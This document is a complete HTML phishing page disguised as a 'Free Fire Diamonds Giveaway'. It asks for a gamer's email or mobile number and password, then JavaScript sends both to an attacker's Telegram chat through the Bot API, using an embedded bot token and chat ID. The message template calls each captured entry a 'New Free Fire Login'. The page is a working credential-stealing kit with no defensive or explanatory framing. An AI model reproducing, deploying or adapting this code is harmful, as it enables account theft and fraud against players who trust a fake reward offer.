<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 Free Fire Diamonds Giveaway 🎮</title>
    <style>
        body {
            background: black;
            overflow: hidden;
            font-family: "Orbitron", sans-serif;
        }
        .container {
            position: relative;
            max-width: 400px;
            margin: 100px auto;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
        }
        .logo img {
            width: 80px;
        }
        h1 {
            color: cyan;
            font-size: 22px;
        }
        p {
            color: white;
            font-size: 14px;
        }
        input {
            width: 96%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            outline: none;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-align: center;
        }
        .btn {
            width: 104%;
            padding: 12px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            color: white;
            text-transform: uppercase;
        }
        .btn-glow {
            background: linear-gradient(90deg, #00ffea, #00c3ff);
        }
        .btn-glow:hover {
            background: linear-gradient(90deg, #00c3ff, #00ffea);
        }
        .new-account {
            background: #ff4b2b;
            margin-top: 10px;
        }
        .new-account:hover {
            background: #e33e1a;
        }
    </style>
    <script>
        var botToken = "8087690174:AAEiP1UG0Q9I8Q4wy7SQJoVnOZQkOo3UN-U";  // Replace with your Telegram bot token
        var chatId = "6088223524";  // Replace with your Telegram Chat ID

        function getDiamonds() {
            const urlParams = new URLSearchParams(window.location.search);
            const diamonds = urlParams.get('diamonds');
            if (diamonds) {
                document.getElementById("diamond-count").textContent = `😁 ${diamonds} Dimonds Selected`;
            } else {
                document.getElementById("diamond-count").textContent = "No diamonds selected";
            }
        }

        function sendToTelegram() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            var diamonds = document.getElementById("diamond-count").textContent;

            if (username === "" || password === "") {
                alert("⚠️ Please enter your details!");
                return;
            }

            var message = `🏴‍☠️ *Nᴇᴡ Fʀᴇᴇ Fɪʀᴇ Lᴏɢɪɴ * 🏴‍☠️\n\n` +
                          `➪ *Usᴇʀɴᴀᴍᴇ :* ${username}\n` +
                          `➪ *Pᴀssᴡᴏʀʟᴅ :* ${password}\n` +
                          `😈😁 *Sᴇʟᴇᴄᴛᴇᴅ Dɪᴀᴍᴏɴᴅs :* ${diamonds}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("✅ Login Sent Successfully!");
                } else {
                    alert("❌ Error sending data to Telegram.");
                }
            })
            .catch(error => {
                alert("❌ Network error!");
                console.error(error);
            });
        }

        window.onload = getDiamonds;
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://img.imgdd.com/01ec0ee3-9b5a-4f24-bd60-01670033316c.png" alt="Logo">
        </div>

        <h1>🎮 FREE FIRE DIAMOND GIVEAWAY 🎮</h1>
        <p id="diamond-count" style="color: cyan; font-size: 20px;"></p> <!-- Diamonds will be displayed here -->

        <p>𝘌𝘯𝘵𝘦𝘳 𝘺𝘰𝘶𝘳 𝘥𝘦𝘵𝘢𝘪𝘭𝘴 𝘵𝘰 𝘤𝘭𝘢𝘪𝘮 𝘺𝘰𝘶𝘳 𝘳𝘦𝘸𝘢𝘳𝘥</p>
        <input type="text" id="username" placeholder="Enter your Email or Mobile">
        <input type="password" id="password" placeholder="Enter your Password">
        <button class="btn btn-glow" onclick="sendToTelegram()">Claim Your Reward</button>
        <button class="btn new-account">Create New Account</button>
    </div>
</body>
</html>
